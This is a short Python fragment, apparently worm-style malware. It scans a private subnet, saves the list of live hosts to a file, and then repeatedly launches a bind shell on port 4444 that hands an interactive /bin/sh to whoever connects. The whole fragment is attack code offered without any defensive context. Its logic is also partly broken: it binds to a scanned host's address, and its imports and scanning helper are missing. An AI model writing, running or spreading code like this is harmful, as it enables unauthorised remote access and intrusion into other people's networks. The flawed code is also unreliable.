def worm():
    net = "192.168.1.0/24"  
    while True:
        active_hosts = scan_network(net)
        # Store the list of active hosts in a file
        with open('active_hosts.txt', 'w') as file:
            file.write('\n'.join(active_hosts))
        
        
        if active_hosts:
            
            first_host = active_hosts[0]
            
            # Start a listener on the first host
            os.system(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"{first_host}\",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        
        time.sleep(random.randint(60, 120))  
